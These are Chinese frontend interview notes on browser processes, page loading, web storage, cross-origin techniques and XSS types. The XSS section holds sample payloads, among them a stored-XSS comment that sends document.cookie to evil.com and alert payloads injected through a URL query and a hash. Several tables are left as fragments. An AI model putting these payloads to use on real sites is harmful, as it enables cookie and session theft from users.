## 1. JS 单线程模型

> JavaScript语言的一大特点就是单线程，也就是说，同一时间只能做一件事，前面的任务没做完，后面的任务只能等着。

1. 为什么JavaScript是单线程的呢?

- 这主要与JavaScript用途有关。它的主要用途是与用户互动，以及操作DOM。如果JavaScript是多线程的，会带来很多复杂的问题，假如 JavaScript有A和B两个线程，A线程在DOM节点上添加了内容，B线程删除了这个节点，应该是哪个为准呢? 所以，为了避免复杂性，所以设计成了单线程。

- 虽然 HTML5 提出了Web Worker标准。Web Worker 的作用，就是为 JavaScript 创造多线程环境，允许主线程创建 Worker 线程，将一些任务分配给后者运行。但是子线程完全受主线程控制，且不得操作DOM。所以这个并没有改变JavaScript单线程的本质。一般使用 Web Worker 的场景是代码中有很多计算密集型或高延迟的任务，可以考虑分配给 Worker 线程。

- 但是使用的时候一定要注意，worker 线程是为了让你的程序跑的更快，但是如果 worker 线程和主线程之间通信的时间大于了你不使用worker线程的时间，结果就得不偿失了。

2. 浏览器内核中线程之间的关系

- “UI线程” 和 “JS线程” 是同一个 “主线程”。 更准确地说，它们共享同一个线程，并且在这个线程上互斥地运行。

  - 主线程：一个物理线程，是浏览器标签页的核心

  - JS 线程：主线程在执行 JavaScript 代码时扮演的角色

  - UI 线程：主线程在进行 渲染计算时扮演的角色

  - Web Worker：独立的物理线程，专门用于执行JS，不阻塞主线程

- GUI渲染线程和JS引擎线程互斥

  - js是可以操作DOM的，如果在修改这些元素的同时渲染页面（js线程和ui线程同时运行），那么渲染线程前后获得的元素数据可能就不一致了。

- JS阻塞页面加载

  - js如果执行时间过长就会阻塞页面

3. 浏览器是多进程的优点

- 默认新开 一个 tab 页面 新建 一个进程,所以单个 tab 页面崩溃不会影响到整个浏览器。

- 第三方插件崩溃也不会影响到整个浏览器。

- 多进程可以充分利用现代 CPU 多核的优势。

- 方便使用沙盒模型隔离插件等进程,提高浏览器的稳定性。

4. 进程和线程又是什么呢

进程（process）和线程（thread）是操作系统的基本概念。

- 进程是 CPU 资源分配的最小单位（是能拥有资源和独立运行的最小单位）。

- 线程是 CPU 调度的最小单位（是建立在进程基础上的一次程序运行单位）。

> 由于每个进程至少要做一件事,所以一个进程至少有一个线程。系统会给每个进程分配独立的内存,因此进程有它独立的资源。同一进程内的各个线程之间共享该进程的内存空间（包括代码段,数据集,堆等）。

5. 任务队列

- 单线程就意味着，所有任务都要排队执行，前一个任务结束，才会执行后一个任务。

- 如果一个任务需要执行，但此时JavaScript引擎正在执行其他任务，那么这个任务就需要放到一个队列中进行等待。等到线程空闲时，就可以从这个队列中取出最早加入的任务进行执行（类似于我们去银行排队办理业务，单线程相当于说这家银行只有一个服务窗口，一次只能为一个人服务，后面到的就需要排队，而任务队列就是排队区，先到的就优先服务）

注意： 如果当前线程空闲，并且队列为空，那每次加入队列的函数将立即执行。

> 为什么会有任务队列？ 由于 JS 是单线程的，同步执行任务会造成浏览器的阻塞，所以我们将 JS 分成一个又一个的任务，通过不停的循环来执行事件队列中的任务。

## 2. Chrome 打开一个页面需要启动多少进程？分别有哪些进程？

打开 1 个页面至少需要 **1 个网络进程、1 个浏览器进程、1 个 GPU 进程以及 1 个渲染进程**，共 4 个；最新的 Chrome 浏览器包括：**1 个浏览器（Browser）主进程、1 个 GPU 进程、1 个网络（NetWork）进程、多个渲染进程和多个插件进程**。

- **每个页面的新进程**

  - `渲染进程`：核心任务是将 HTML、CSS 和 JavaScript 转换为用户可以与之交互的网页，**排版引擎 Blink 和 JavaScript 引擎 V8 都是运行在该进程中**，默认情况下，**Chrome 会为每个 Tab 标签创建一个渲染进程**。出于安全考虑，渲染进程都是运行在沙箱模式下。**解析 HTML、CSS，布局页面（渲染），并执行 JavaScript。**

- 多个共享进程，在打开浏览器就打开了，被多个页面共享

  - `浏览器进程`：主要负责**界面显示、用户交互、子进程管理**，同时提供存储等功能。

  - `GPU 进程`：其实，Chrome 刚开始发布的时候是没有 GPU 进程的。而 GPU 的使用初衷是为了**实现 3D CSS 的效果**，只是随后网页、Chrome 的 UI 界面都选择采用 GPU 来绘制，这使得 GPU 成为浏览器普遍的需求。最后，Chrome 在其多进程架构上也引入了 GPU 进程。

  - `网络进程`：主要负责**页面的网络资源加载**，之前是作为一个模块运行在浏览器进程里面的，直至最近才独立出来，成为一个单独的进程。

  - `插件进程`：主要是负责插件的运行，因插件易崩溃，所以需要通过插件进程来隔离，以保证插件进程崩溃不会对浏览器和页面造成影响。

| 进程                           | 包含的主要线程                    | 职责                                                                                                           |

## 3. 从浏览器地址栏输入URL到显示页面的步骤

### 1. URL解析

- 浏览器解析URL结构：协议，主机名，端口，路径，查询参数

- 非完整URL，浏览器尝试补全

### 2. 检查缓存

- 检查本地缓存是否有该资源

- 通过 Cache\-Control，Expires检查资源是否新鲜

  - HTTP1\.0提供`Expires`，值为一个**绝对时间**表示缓存新鲜日期

  - HTTP1\.1增加了`Cache-Control: max-age=`,值为以**秒为单位的最大新鲜时间**

- 如果缓存有效直接使用缓存资源

### 3. DNS解析

1. 查询本地缓存：浏览器DNS缓存，系统DNS缓存

2. 递归查询

   1. 向本地DNS服务器发起请求

   2. 未命中，本地DNS依次查询根域名服务器，顶级域服务器，权威域服务器

3. 获取IP

### 4. 建立TCP连接

- 三次握手

1. 客户端发送一个TCP的（同步标志位）`SYN=1`，（随机生成的初始序号）`seq=X`的包到服务器端口

2. 服务器发回`SYN=1`，`ACK=1`（确认标志位）， `seq=Y`（自己的初始序号）的响应包，同时确认客户端的序列号（确认号） `ack = x + 1`

3. 客户端发送`ACK=1`，确认服务器的序列号 `ack = y + 1`，并可能携带数据

### 5. HTTP请求与响应

- 浏览器组装HTTP请求报文发送请求

- 服务器接受请求并解析，将请求转发到服务器程序，将响应报文通过TCP连接发送回浏览器

- 浏览器接受HTTP响应，根据情况选择关闭TCP连接或保留，关闭TCP的四次握手

  - 主动方发送`FIN=1`（结束标志位），`ACK=Z`，`Seq=X`报文

  - 被动方发送`ACK=1`，`Seq=Z`，`ack=x+1`（确认号）报文

  - 被动方发送`Fin=1`，`ACK=X`，`Seq=Y`报文

  - 主动方发送`ACK=Y`，`Seq=X`报文

### 6. 解析与渲染

#### 6.1 构建DOM树

1. 将字符流解析成标记

2. 词法分析将标记转换为对象并定义属性和规则

3. 根据HTML标记关系将对象组成DOM树

4. 遇到 \<script\> （无async/defer）时暂停解析，先下载执行js

#### 6.2 构建CSSOM树

1. 字符流转换为标记流

2. 根据标记创建节点

3. 节点创建CSSOM树

#### 6.3 根据DOM树和CSSOM树构建渲染树

1. 从DOM树根节点遍历所有可见节点，不可见节点：本身不可见的标签，被css隐藏的节点，如display：none

2. 对每一个可见节点找到CSSOM规则并应用

3. 生成带样式的渲染树

#### 6.4 布局(Layout/Reflow)

- 计算每个结点的几何信息，在页面上的位置和大小

#### 6.5 绘制（Paint）

- 将布局结果转为像素，包括文本、颜色、边框等

- 可能分层绘制

#### 6.6 合成（Compositing）

- 合并各层，通过GPU光栅化输出到屏幕

## 4. js解析

1. 浏览器创建Document对象并解析HTML，将解析的元素和文本节点添加到文档时，此时`document.readystate为loading`。

2. HTML解析器遇到没有`async`和`defer`的`script`时，立即停止HTML解析，下载并执行脚本。可以用`document.write()`修改文档流（现代开发中不推荐）。同步脚本可以访问之前已解析的DOM。

3. 当解析起遇到`async`属性的script，开始下载脚本并继续解析文档，不阻塞HTML解析，脚本在下载完成后立即执行（可能中断解析）。异步脚本禁止使用`document.write()`，因为文档流可能已经改变。他们可以访问自己的`script`和之前的文档元素。执行顺序不确定，先下载完的先执行。可能在 DOMContentLoaded 之后执行。

4. 所有`defer`脚本下载异步执行，不阻塞HTML解析。延迟到DOM解析完成后、DOMContentLoaded前，按照文档中的顺序执行。能够访问完成DOM树，禁止`document.write()`\.

5. 当HTML解析完成\(DOM树构建完毕\)，`document.readyState`变成`interactive`。此时按照顺序执行所有`defer`脚本（所以defer脚本不会阻塞HTML解析，因为此时HTML已经解析完成了）。

6. 浏览器在Document对象上触发`DOMContentLoaded`事件。标识DOM已就绪（但外部资源可能未加载完），这是DOM操作的安全时机（如`document.addEventListener("DOMContentLoaded", ...)`）

7. 浏览器继续加载图片、iframe等外部资源，所有资源加载完毕并且异步脚本执行完成后，`document.readyState`变为`complete`，`window`触发`load`事件。

| 属性 / 方法                               | 触发时机                                                | 作用范围         | 适用场景                                                                  |
| ----------------------------------------- | ------------------------------------------------------- | ---------------- | ------------------------------------------------------------------------- |
| `DOMContentLoaded`（或 `document.ready`） | DOM 树构建完成，不等待 CSS、图片、iframe 等外部资源加载 | 只关心 DOM 节点  | 操作 DOM 节点、绑定事件监听器                                             |
| `window.onload`                           | 所有资源加载完成，包括 DOM、CSS、图片、iframe、JS 等    | 页面整体加载完成 | 页面完全呈现后执行初始化逻辑，如获取图片尺寸、初始化 Canvas、图片相关操作 |

> 1. `document.readyState` 可以在任意时刻获取当前状态：
>
>    - `loading`：HTML 正在解析
>
>    - `interactive`：DOM 树已构建，外部资源可能未完成
>
>    - `complete`：所有资源加载完成，相当于 `load` 事件触发
>
> 2. `DOMContentLoaded` vs `load`：
>
>    - `DOMContentLoaded`：仅依赖DOM解析完成，不等待图片等资源。
>
>    - `load`：所有资源（图片、样式表等）加载完毕。
>
> 3. `async` 和 `defer` 的区别：
>
> ![Image](https://internal-api-drive-stream.feishu.cn/space/api/box/stream/download/authcode/?code=ODkwMjJiZDkwYjc4MzdmNjdiMTg4OWMxOTE4NGYxNzNfMTJlZjFjOGNkMjY4ZDExOTkxYzU1M2M5NjRhY2U0ZGRfSUQ6NzUzNTcxMzkzNDc2MDg2OTg5MV8xNzg2ODkxNjM1OjE3ODY5NzgwMzVfVjM)
>
> - 优先使用 `defer`：若脚本依赖DOM（如操作元素），用 `defer` 保证执行时DOM已就绪。
>
> - 慎用 `async`：适合无依赖的独立脚本（如广告、 analytics），但要注意执行顺序问题。
>
> - 避免 `document.write()`：在现代SPA或异步脚本中会导致意外行为。
>
> 4. defer和async下载和执行的分离：
>
> - 下载阶段：由**网络线程（浏览器进程）**异步下载脚本文件，不阻塞主线程（渲染引擎和JS引擎）
>
> - 执行阶段：下载完成后 JS 代码由JS引擎执行，此时阻塞渲染引擎（JS引擎和渲染引擎是互斥执行的，一个执行另一个就阻塞）。由于defer执行时html已经解析完了，所以不会阻塞渲染引擎

## 5. HTML 页面加载流程

1. **HTML 文档解析**

- **顺序：** 字节流从上到下解析，构建 DOM 树。

- **预解析优化 (Preload Scanner)：** 现代浏览器会开启“预扫描”线程，在主解析器被脚本阻塞时，提前下载后续的 `<img>`、`<link>`、`<script>` 等资源，**不再是死板的单线程等待**。

- **阻塞情况：** 解析器遇到同步 `<script>`（且未加载完）时会停止工作，等待脚本下载并执行。

1. **`<head>` 中的资源**

- **\<meta\> 和 \<title\>**：

  - 不涉及外部资源，直接解析，耗时极短。

  - **顺序**：按文档顺序立即处理。

- **\<link rel="stylesheet"\>（外部 CSS）**：

  - **加载行为：** 异步下载。

  - **不阻塞 DOM 解析：** 浏览器会继续构建 DOM 树。

  - **阻塞渲染：** 必须等待 CSSOM 构建完成，页面才会开始渲染（防止 FOUC 无样式闪烁）。

  - **间接阻塞：** 如果其后紧跟同步 JS，CSS 会阻塞该 JS 的执行，从而间接拖慢 DOM 解析。

- **\<style\>（内联 CSS）**：

  - 直接解析，计入 CSSOM，无需外部请求。

  - **阻塞渲染**：与外部 CSS 类似，需等待 CSSOM 构建完成。

- **\<script\>（外部 JavaScript）**：

  - **同步脚本（无 async 或 defer）**：

    - 阻塞 DOM 解析和渲染。

    - **顺序**：按 \<script\> 出现顺序逐一加载、解析、执行。

    - 执行完成后继续解析 HTML。

  - **异步脚本（async）**：

    - 异步下载，不阻塞 DOM 解析。

    - 下载完成后立即执行，可能会暂停 DOM 解析。

    - **顺序**：多个 async 脚本的执行顺序不可预测，取决于下载完成时间。

  - **延迟脚本（defer）**：

    - 异步下载，不阻塞 DOM 解析。

    - 延迟到 DOM 解析完成（DOMContentLoaded 事件触发前）按文档顺序执行。

    - **顺序**：严格按 \<script\> 出现顺序执行。

- **\<link rel="preload"\>（预加载资源）**：

  - **优先级高于普通资源，异步加载但不执行**（需手动使用）。

  - 用于关键资源（如字体、关键 CSS/JS），浏览器会尽早下载。

  - **顺序**：优先于普通资源加载，但不阻塞解析或渲染。

- **\<link rel="prefetch"\> 或 \<link rel="dns\-prefetch"\> 等**：

  - **低优先级预加载**（如 DNS 解析或未来页面资源），不影响当前页面加载。

  - **顺序**：**通常在空闲时加载，优先级最低**。

3. **\<body\> 中的资源**

- **内联 HTML 元素**：

  - 直接解析，添加到 DOM。

  - **顺序**：按文档顺序逐行处理。

- **\<img\>（图像）**：

  - **异步加载**，不阻塞 DOM 解析或渲染。

  - **顺序**：按 \<img\> 出现顺序发起请求，加载顺序取决于网络响应速度。

  - **特殊情况**：

    - 如果 \<img\> 使用 loading="lazy"，延迟加载（仅在进入视口时加载）。

    - 如果 \<img\> 使用 decoding="async"，图像解码异步进行，不阻塞渲染。

- **\<script\>（外部或内联脚本）**：

  - 行为与 \<head\> 中的 \<script\> 相同（同步、异步或延迟）。

  - **同步脚本**：阻塞 DOM 解析和渲染。

  - **异步脚本（async）**：下载完成后立即执行，可能中断 DOM 解析。

  - **延迟脚本（defer）**：等到 DOM 解析完成后再执行。

- **\<iframe\>**：

  - **异步加载，内部内容独立解析**（类似新 HTML 文档）。

  - **顺序**：按 \<iframe\> 出现顺序发起请求，加载顺序取决于网络。

  - **影响：** 不阻塞主页面 DOM 解析，但会占用连接数，且主页面的 `window.onload` 必须等 iframe 全部加载完才触发。

  - 不阻塞主页面 DOM 解析，但可能影响渲染性能。

- **\<video\>、\<audio\> 等多媒体**：

  - 类似 \<img\>，异步加载。

  - 如果有 poster 属性（视频封面图像），与 \<img\> 类似加载。

  - **顺序**：按文档顺序发起请求。

- **Web 字体（@font\-face）**：

  - 通常通过 CSS 文件或内联 \<style\> 引用，异步加载。

  - **阻塞渲染**：浏览器可能延迟文本渲染（FOUT，Flash of Unstyled Text），或显示备用字体直到字体加载完成。

  - **顺序**：按 CSS 中 @font\-face 声明顺序加载。

4. **动态加载的资源**

- **通过 JavaScript 动态加载的资源**：

  - 如通过 document.createElement('script') 或 fetch() 加载的资源。

  - **顺序**：取决于 JavaScript 执行时间和代码逻辑。

  - 不阻塞 DOM 解析，但可能影响渲染（例如动态插入的 \<img\>）。

- **CSS 背景图像**：

  - 在 CSSOM 构建后加载，优先级低于 \<img\>。

  - **顺序**：按 CSS 规则解析顺序发起请求，异步加载。

5. **事件触发阶段**

- **DOMContentLoaded**：

  - 在 DOM 解析完成（所有 defer 脚本执行后）触发。

  - 不等待异步资源（如 \<img\>、异步 \<script\>、字体等）加载完成。

- **load 事件**：

  - 在所有资源（包括 \<img\>、\<iframe\>、异步脚本等）加载完成后触发。

## 6. 浏览器内核的理解

浏览器内核是浏览器的核心组成部分，主要分为两个部分：渲染引擎（也称为布局引擎或渲染引擎）和 JavaScript 引擎。

- **渲染引擎**：渲染引擎负责解析网页的 HTML、XML、图像等内容，并将其转换为可视化的网页形式展示给用户。它负责处理网页的布局、样式计算、绘制等任务。不同浏览器的内核对网页的解释和渲染方式可能会有差异，因此不同浏览器的渲染效果也会有所不同。常见的渲染引擎包括：

  - **`WebKit`**：主要用于 Safari 和 Chrome 浏览器。

  - `Gecko`：主要用于 Firefox 浏览器。

  - `Trident`：主要用于旧版本的 Internet Explorer 浏览器。

  - **`Blink`**：基于 WebKit，用于 Chrome、Opera 和部分 Chromium 浏览器。

- **JavaScript 引擎**：JavaScript 引擎负责解析和执行网页中的 JavaScript 代码，实现网页的动态交互和功能。不同浏览器的 JavaScript 引擎性能和特性也可能存在差异。常见的 JavaScript 引擎包括：

  - **`V8`**：用于 `Chrome` 和 `Opera` 浏览器，具有高性能和快速执行速度。

  - `SpiderMonkey`：用于 `Firefox` 浏览器。

  - **`JavaScriptCore`**：用于 `Safari` 浏览器。

## 7. 请描述一下 `cookies`，`sessionStorage` 和 `localStorage` 的区别？

**存储容量**

- `cookies`：通常存储容量较小，一般限制在4KB左右。

- `sessionStorage`：存储容量比 `cookies` 大，不同浏览器的限制有所不同，但一般可以存储5MB或更多的数据。

- `localStorage`：存储容量也较大，通常和 `sessionStorage` 相近，能满足大多数 Web 应用的存储需求。

**数据有效期**

- `cookies`：可以设置过期时间，若不设置，默认在浏览器关闭时失效。如果设置了过期时间，那么在过期时间之前，`cookies` 会一直存在于客户端，即使浏览器关闭后重新打开也依然有效。

- `sessionStorage`：数据仅在当前会话期间有效，当浏览器窗口关闭时，`sessionStorage` 中的数据会被自动清除。

- `localStorage`：数据没有自动过期时间，除非主动删除，否则数据会一直保存在客户端，即使浏览器关闭、电脑重启，数据依然存在。

**作用域**

- `cookies`：在同域名下的不同页面之间可以共享，但如果设置了 `Path` 属性，那么只有在指定路径下的页面才能访问该 `cookie`。此外，`cookies` 还可以通过设置 `Domain` 属性在不同子域名之间共享。

> 子域名：
> 在主域名前添加前缀（子域名），形成独立的站点或服务，例如：
>
> - `https://blog.example.com`
>
> - `https://shop.example.com`

- `sessionStorage`：具有严格的页面级作用域，即只有在同一个浏览器窗口（或标签页）中打开的页面才能共享 `sessionStorage` 中的数据。不同浏览器窗口或标签页之间无法访问彼此的 `sessionStorage` 数据，即使它们来自同一个域名。

- `localStorage`：在同域名下的所有页面都可以共享 `localStorage` 中的数据，只要是在同一个浏览器中访问该域名，无论在哪个页面存储的数据，其他页面都可以读取和修改。

**与服务器的交互**

- `cookies`：每次向服务器发送请求时，浏览器会自动将同域名下的 `cookies` 发送到服务器，这可能会增加不必要的网络传输开销，尤其是当 `cookies` 数据量较大时。

- `sessionStorage` 和 `localStorage`：数据仅存储在客户端，不会自动发送到服务器。如果需要与服务器进行数据交互，需要通过 Ajax 等方式手动将数据发送到服务器。

**应用场景**

- `cookies`：常用于存储用户登录状态、购物车信息、用户偏好设置等。由于其会在每次请求时发送到服务器，所以也可以用于在客户端和服务器之间传递一些少量的必要信息。

- `sessionStorage`：适合存储一些临时数据，例如在一个多步骤的表单填写过程中，存储用户在当前页面填写的数据，当用户完成整个流程或关闭页面时，这些数据就不再需要了。

- `localStorage`：用于长期存储用户相关的数据，如用户的配置信息、离线缓存数据等。例如，一个 Web 应用可以将一些常用的静态资源存储在 `localStorage` 中，以便在离线状态下仍然能够访问应用的部分功能。

## 8. 请你谈谈Cookie的弊端

`cookie`虽然在存储客户端数据方面提供了方便，并减轻了服务器的负担，但它也存在一些弊端和限制，包括：

- **数量限制：**每个特定域名下的`cookie`数量有限。例如，旧版的`IE6`最多允许20个`cookie`，而`IE7`及更高版本允许50个`cookie`，其他浏览器也有类似的限制。

- **大小限制**：每个`cookie`的大小也有限制，通常为约4kb

- **清理策略**：一些浏览器会根据策略清理过期或不常使用的`cookie`，这可能会导致某些数据丢失或需要重新设置。

- **安全性问题**：`cookie`存储在客户端，如果被恶意拦截，攻击者可以获取其中的数据，包括`session`信息，可能导致安全隐患。

- **跨域限制**：`cookie`在同源策略下工作，无法跨域访问。每个域名下的`cookie`只能被同域名的页面访问和修改。

- **对网络性能的影响**：`cookie`会增加每个请求的数据量，从而增加了网络传输的开销，尤其在请求大量静态资源的网页时，会对加载速度产生一定的影响。

要解决这些问题，可以使用其他存储方式，如`localStorage`或`sessionStorage`，使用服务器端存储来替代部分或全部`cookie`，或者通过其他技术手段来优化和管理`cookie`的使用。

## 9. 跨域方案

### 9.1 跨域问题的根本原因

**同源策略 (Same\-Origin Policy)**：
浏览器的安全限制，**非同源网页无法访问彼此的数据**。

- **同源**：协议、域名、端口 **三者完全一致**

**例子：**

- 页面 URL：http://a\.com:8080
- 请求 URL：http://api\.a\.com:80
  **不同源**：域名不同（a\.com vs api\.a\.com），端口不同（8080 vs 80）。

> 注意：**浏览器端才有跨域问题**，服务器和服务器之间直接通信没有跨域限制。

**存在原因**

- 防止 **跨站脚本攻击 (XSS)** 或 **跨站请求伪造 (CSRF)**。

- 避免一个网站的 JS 任意访问另一个网站的敏感数据（如用户信息、账号 Cookie）。

---

### 9.2 常见的跨域场景

1. **AJAX/Fetch 请求（最常见的）**

- 你不能通过 `XMLHttpRequest` 或 `Fetch` API 从 `a.com` 的脚本去请求 `b.com` 的数据并读取响应。浏览器会发送请求，但会**阻止脚本读取返回的数据**。（这就是你经常遇到的 **CORS 错误**的根源）。

2. **DOM 访问**

- 一个页面（`a.com`）无法通过 JavaScript 去读取或操作另一个页面（`b.com`）的 DOM。

- _例如：_ 你的页面里有一个 `<iframe>`，如果这个 `<iframe>` 里加载的是**不同源**的网页，你的主页面脚本就无法获取 `<iframe>` 内部的文档内容（比如读取里面的表单值）。

3. **本地存储 \(LocalStorage, Cookies, IndexedDB\)**

- `a.com` 无法读取或写入 `b.com` 设置的 `Cookies`、`LocalStorage` 或 `IndexedDB` 数据。这保证了你的登录状态和本地数据不会被其他网站窃取。

---

### 9.3 解决方案

#### 1. **CORS (Cross-Origin Resource Sharing，跨域资源共享)** —— 最推荐的标准方案

**原理**

- 服务器通过设置 **响应头** 告诉浏览器哪些域可以访问资源。

- 浏览器收到响应头后，判断是否允许前端代码读取数据。

**关键 HTTP 响应头**

```YAML
HTTP/1.1 204 No Content # 状态码通常是2xx，比如200或204
Access-Control-Allow-Origin: http://example.com   # 或者 *
Access-Control-Allow-Methods: GET, POST, PUT, DELETE
Access-Control-Allow-Headers: Content-Type, Authorization
Access-Control-Allow-Credentials: true  # 是否允许携带 Cookie
Access-Control-Max-Age: 86400 # （可选）告诉浏览器可以将这个预检结果缓存多久（秒），在此期间内不再发送预检请求
... (其他一些服务器头)
```

- **简单请求**（GET/POST/HEAD，无特殊头部）

  - 浏览器直接请求，检查返回头是否满足条件。

- **预检请求（Preflight Request）**

  - 对于非简单请求（PUT、DELETE、带自定义头），浏览器先发 `OPTIONS` 请求，确认服务器允许，再发真实请求。

#### 2. **JSONP (JSON with Padding)** —— 仅 GET 的早期方案

**原理**

- `<script>` 标签不受同源策略限制，可以跨域加载脚本。

- 服务端返回一个 **函数调用** 包裹数据，前端执行该函数处理数据。

**示例**

- 假设页面在 **http://a\.com/index\.html** ，要请求 **http://b\.com/data** 里的数据。

- 前端：

```XML
<script>
  // 1. 先定义一个回调函数
  function handleData(data) {
    console.log("跨域获取到数据：", data);
  }
</script>

<!-- 2. 用 script 跨域请求，告诉后端回调函数名字 -->
<script src="http://b.com/data?callback=handleData"></script>
```

- 后端返回：

```JavaScript
handleData({ name: "Tom", age: 18 });
```

**浏览器执行效果：**

1. 浏览器加载 `http://b.com/data?callback=handleData`

2. 这段返回的“脚本”是 `handleData({ name: "Tom", age: 18 });`

3. 页面立即执行这个函数，前端就拿到了数据。

#### 3. **反向代理（开发环境常用）**

**原理**

- 浏览器访问 **同源的中间服务器**，由中间服务器转发请求到目标跨域 API。

- 浏览器和中间服务器同源，因此无跨域问题。

**实现**

- **Webpack DevServer**

`webpack` 在 `devServer` 选项里面提供了一个 `proxy` 的参数供开发人员进行反向代理

```Java
module.exports = {
  // ... 其他 webpack 配置
  devServer: {
    proxy: {
      '/api': {
        target: 'http://api.example.com',  // 要代理的真实 API
        changeOrigin: true,                // 修改请求头中的 Host 为目标地址
        pathRewrite: { '^/api': '' },      // 如果后端不需要 /api 前缀就重写
        secure: false                      // 如果是 https 且证书无效，需设为 false
      }
    }
  }
};

```

```JavaScript
fetch('/api/users')  // 发送给 localhost:8080/api/users
  .then(res => res.json())
  .then(data => console.log(data));

```

> 浏览器以为是请求本地的 `/api/users`，Webpack dev server 自动把它转发到 `http://api.example.com/users`。

- **Nginx 配置**

```JavaScript
location /api/ {
    proxy_pass http://backend.example.com/;
}
```

---

#### 4. **postMessage \+ iframe 通信**

**原理**

- `window.postMessage()` 可在不同源的页面间安全传递消息。

- 通常用于 **主页面与嵌套 iframe 的双向通信**。

**示例**

iframe 页面：

```JavaScript
window.parent.postMessage({data: "hello"}, "http://main.com");
```

主页面：

```JavaScript
window.addEventListener("message", (event) => {
  if (event.origin === "http://iframe.com") {
    console.log(event.data);
  }
});
```

- 只能传递消息，不适合直接代替 API 调用

- 需要 iframe 参与，架构复杂

#### 5. **WebSocket（不受同源限制）**

**原理**

- WebSocket 建立连接后不再受同源策略限制，可自由通信。

- 浏览器通过 `ws://` 或 `wss://` 发起连接，与服务端双向通信。

**优点**

- 无跨域问题

- 实时通信、高效

**缺点**

- 需要专门协议和服务端支持

- 不适合 REST 风格 API（主要用于实时推送）

| ----------------------------------------- | -------------------------------------------------------------------------------------------------------------- | ----------------------------------- | ----------------------------------------------------------- |
| **CORS（Cross-Origin Resource Sharing）** | 服务器通过响应头（如 `Access-Control-Allow-Origin`）声明允许哪些源访问，浏览器根据响应头决定是否允许跨域请求。 | AJAX / Fetch / WebSocket            | 支持 GET / POST / PUT / DELETE 等请求，需服务器配合配置。   |

## 10. XSS 和 CSRF

### 10.1 XSS（Cross\-Site Scripting，跨站脚本攻击）

#### 10.1.1 **概念**

- XSS 是指攻击者在网页中注入恶意脚本（通常是 JavaScript），当其他用户访问该网页时，恶意脚本在用户浏览器中执行。

- 本质：**利用浏览器信任网页内容**，执行攻击者注入的代码。

---

#### 10.1.2 **攻击原理**

- 浏览器将网页内容渲染并执行其中的 JS 脚本。

- 如果网页没有对用户输入进行严格过滤或转义，攻击者可以注入任意 JS。

- 被注入的 JS 可以：

  - 读取 Cookie、LocalStorage、SessionStorage

  - 操作 DOM 或表单

  - 发起请求到攻击者控制的服务器

---

#### 10.1.3 **XSS 分类**

**（1）存储型 XSS（Stored XSS）**

- 恶意代码被永久存储在服务器端，如数据库、留言板、评论区。

- 当其他用户访问时，浏览器渲染并执行脚本。

- **危害大**：影响范围广，易被大量用户触发。

**示例：**

```XML
<!-- 评论区输入 -->
<script>fetch('http://evil.com/steal?cookie=' + document.cookie)</script>
```

1. 用户在评论区输入文本

2. 表单提交 → 发送到服务器。

3. 如果服务器**没有对输入进行过滤或转义**，就会直接保存到数据库或文件中：

```JavaScript
INSERT INTO comments (content) VALUES ('<script>fetch(...) </script>');
```

4. 当其他用户访问网页，服务器把评论内容直接渲染到页面：

```XML
<div class="comment">
  <script>fetch('http://evil.com/steal?cookie=' + document.cookie)</script>
</div>
```

5. 浏览器渲染页面时，会执行 `<script>` 标签里的 JS → XSS 被触发。

**（2） 反射型 XSS（Reflected XSS）**

- 恶意代码不存储在服务器，而是通过 URL、表单提交等“反射”回网页执行。

- 核心点：**攻击者的输入直接反射回页面并被执行**。

- 常见场景：

  - 搜索结果页没有对输入转义

  - URL 参数直接输出到页面

- **危害相对小**，需要用户点击恶意链接。

**示例 URL：**

攻击者发现一个网站搜索框的参数（如 `?q=keyword`）会直接显示在结果页面上，且没有进行过滤。

```HTML
<p>搜索结果：{搜索参数}</p>
```

1. 诱骗点击：攻击者精心构造一个恶意链接，并将恶意脚本作为参数值：
   `http://victim-site.com/search?q=<script>alert('XSS')</script>`
   然后通过邮件、论坛等方式诱骗用户点击这个链接。

2. 服务器响应：用户点击后，浏览器向 `victim-site.com` 发起请求，这个恶意脚本 \(`<script>...`\) 作为 `q` 参数的值被发送到服务器。

3. 服务器返回：服务器在处理请求时，未对参数进行过滤或转义，就直接将搜索关键词（即我们的恶意脚本）嵌入到返回的HTML页面中。

```JavaScript
<p>搜索结果：<script>alert('XSS')</script></p>
```

4. 浏览器执行：用户的浏览器接收到服务器的响应，将其作为正常的HTML解析。当解析到 `<script>` 标签时，就会立即执行其中的恶意代码。

> 关键特点：
>
> - 经过服务器：恶意脚本作为HTTP请求的一部分发送到服务器，并由服务器“反射”回响应中。服务器端的日志会记录下这次恶意请求。
> - 非持久化：它不会存储在服务器上，每次攻击都需要诱骗用户点击一个特定的链接。因此也称为“非持久型XSS”。

**(3) DOM 型 XSS**

- 攻击直接通过浏览器端 JS 操作 DOM 实现，服务器端未必处理。

- 前端脚本直接执行

- **典型场景**：

  - `document.write(location.hash)` 或 `innerHTML` 不安全

  - 通过前端 JS 拼接 URL 参数注入脚本

**示例：**

1. 攻击构造：攻击者构造一个恶意URL，其中包含被前端JS代码使用的片段标识（hash）或参数：
   `http://victim-site.com/welcome#``<img`` src=x onerror=alert('XSS')>`

1. 服务器响应：用户被诱骗点击此链接。浏览器向服务器请求 `http://victim-site.com/welcome`。请注意，**`#`**** 及其后面的内容（称为 fragment）不会被发送到服务器！ 服务器返回一个正常的、不包含恶意代码的HTML页面。**

1. 客户端处理：返回的页面中包含一段不安全的JavaScript代码，例如：

```JavaScript
// 不安全的代码！从URL的hash中获取数据并直接写入DOM。
document.getElementById('message').innerHTML = location.hash.substring(1);
```

4. 浏览器执行：这段JS代码从 `location.hash` 中提取出 `#` 后面的内容（即 `<img src=x onerror=alert('XSS')>`），并通过 `innerHTML` 将其写入到页面的DOM中。浏览器在解析新插入的HTML时，会看到 `<img>` 标签并尝试加载。当 `src="x"` 加载失败时，会触发 `onerror` 事件，从而执行其中的JavaScript代码 `alert('XSS')`。

> 关键特点：
>
> - 不经过服务器：恶意 payload 完全在客户端处理。服务器可能完全不知情，因为攻击载体（如 URL 的 hash）可能根本不会被发送到服务器。
> - 纯客户端漏洞：漏洞的根源在于前端JavaScript代码的不安全编写，与服务器端代码无关（服务器可能已经对返回的内容进行了正确的转义）。
> - 同样非持久化：也需要诱骗用户点击特定链接。

| 类型                            | 攻击原理                                                                                                              | 数据流向                                          | 常见场景                                      | 特点                                                     |
| ------------------------------- | --------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------- | --------------------------------------------- | -------------------------------------------------------- |
